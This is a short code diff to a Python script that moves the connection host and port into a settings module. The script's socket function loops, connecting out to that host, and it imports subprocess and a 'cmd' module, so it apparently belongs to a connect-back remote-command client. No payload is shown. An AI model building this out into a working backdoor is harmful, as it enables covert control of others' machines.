@@ -1,7 +1,7 @@
 import socket
 import sys, time, os
 import subprocess
-
+import settings
 #Modules in paste modules/
 
 from modules import cmd
@@ -15,8 +15,8 @@ def socket_create():
 	global s
 	global host
 	global port
-	host = ""
-	port = 9999
+	host = settings.host
+	port = settings.port
 	s = socket.socket()
 	while True:
 		conec = s.connect_ex((host,port))
